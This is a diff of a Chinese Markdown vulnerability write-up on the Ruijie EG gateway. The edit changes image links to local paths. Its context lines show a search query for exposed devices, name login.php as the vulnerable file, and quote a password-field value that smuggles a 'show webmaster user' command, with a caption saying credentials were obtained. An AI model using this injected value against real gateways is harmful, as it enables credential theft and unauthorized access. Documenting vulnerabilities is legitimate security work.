@@ -20,7 +20,7 @@ app="Ruijie-EG易网关"
 
 登录页面如下
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202110926402.png)
+![](./images/202202110926402.png)
 
 漏洞文件 login.php
 
@@ -126,7 +126,7 @@ Accept-Encoding: gzip
 username=admin&password=admin?show+webmaster+user
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202110926492.png)
+![](./images/202202110926492.png)
 
 成功获取账号密码
 
